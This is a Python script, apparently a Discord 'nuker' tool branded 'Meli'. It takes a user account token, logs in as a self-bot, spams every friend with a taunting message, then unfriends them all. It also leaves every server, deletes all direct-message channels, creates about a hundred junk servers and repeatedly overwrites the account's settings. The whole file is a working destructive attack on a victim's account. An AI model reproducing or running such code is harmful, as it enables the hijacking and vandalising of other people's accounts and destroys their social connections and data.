import colorama
import discord
from discord.ext import commands
from colorama import Fore as f
import requests
import time
import json
import os
colorama.init()

meli = discord.Client(command_prefix="meli", self_bot=True);



token = input(f.LIGHTRED_EX + "Enter Token to Nuke> ");



def main():
    os.system("cls");
    print(f.LIGHTMAGENTA_EX + '''
 ███▄ ▄███▓▓█████  ██▓     ██▓    ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
▓██▒▀█▀ ██▒▓█   ▀ ▓██▒    ▓██▒    ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▓██    ▓██░▒███   ▒██░    ▒██▒   ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
▒██    ▒██ ▒▓█  ▄ ▒██░    ░██░   ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
▒██▒   ░██▒░▒████▒░██████▒░██░   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
░ ▒░   ░  ░░░ ▒░ ░░ ▒░▓  ░░▓     ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
░  ░      ░ ░ ░  ░░ ░ ▒  ░ ▒ ░   ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
░      ░      ░     ░ ░    ▒ ░      ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
       ░      ░  ░    ░  ░ ░              ░    ░     ░  ░      ░  ░   ░     
                                                                            
 [1]: Nuke
    ''')
main();
option = input("Select an Option> ");

if option == "1":
    print("nuking time");
else:
    print("Not a valid option...");
    time.sleep(1);
    os.system("cls");
    main();



def hehe():
	for i in range(0, 100):
		headers = {"authorization": token, "user-agent": "meli/0.0"};
		condition_status = True;
		payload = {"theme": "light", "developer_mode": condition_status, "afk_timeout": 60, "locale": "ko", "message_display_compact": condition_status, "explicit_content_filter": 2, "default_guilds_restricted": condition_status, "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status, "mutual_guilds": condition_status}, "inline_embed_media": condition_status, "inline_attachment_media": condition_status, "gif_auto_play": condition_status, "render_embeds": condition_status, "render_reactions": condition_status, "animate_emoji": condition_status, "convert_emoticons": condition_status, "animate_stickers": 1, "enable_tts_command": condition_status,  "native_phone_integration_enabled": condition_status, "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status, "stream_notifications_enabled": condition_status, "status": "idle", "detect_platform_accounts": condition_status, "disable_games_tab": condition_status};
		requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload);
		condition_status = False
		payload = {"theme": "dark", "developer_mode": condition_status, "afk_timeout": 120, "locale": "bg", "message_display_compact": condition_status, "explicit_content_filter": 0, "default_guilds_restricted": condition_status, "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status, "mutual_guilds": condition_status}, "inline_embed_media": condition_status, "inline_attachment_media": condition_status, "gif_auto_play": condition_status, "render_embeds": condition_status, "render_reactions": condition_status, "animate_emoji": condition_status, "convert_emoticons": condition_status, "animate_stickers": 2, "enable_tts_command": condition_status, "native_phone_integration_enabled": condition_status, "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status, "stream_notifications_enabled": condition_status, "status": "dnd", "detect_platform_accounts": condition_status, "disable_games_tab": condition_status};
		requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload);

    
@meli.event
async def on_ready():
    await meli.change_presence(activity=discord.Streaming(name="RAN BY MELI", url="https://www.twitch.tv/meli"))
    for user in meli.user.friends:
        try:
            await user.send(f"{meli} GOT RAN BY MELI LOLOLOL ");
            await user.remove_friend();
        except:
            pass
    for guild in meli.guilds:
        try:
            await guild.leave();
        except:
            pass
    headers = {"authorization": token, "user-agent": "meli/0.0"}
    close = requests.get(
        "https://canary.discord.com/api/v8/users/@me/channels", headers=headers
    ).json()
    for channel in close:
        requests.delete(
            f"https://canary.discord.com/api/v8/channels/{channel['id']}",
            headers=headers,
        )
        headers = {"authorization": token, "user-agent": "meli.0"}
    for i in range(1, 100):
        payload = {"name": "RAN BY MELI"}
        try:
            requests.post(
            "https://canary.discord.com/api/v8/guilds", headers=headers, json=payload
            )
        except:
            print("ratelimited trying again");
            time.sleep(0.3);
    hehe();

meli.run(token, bot=False);
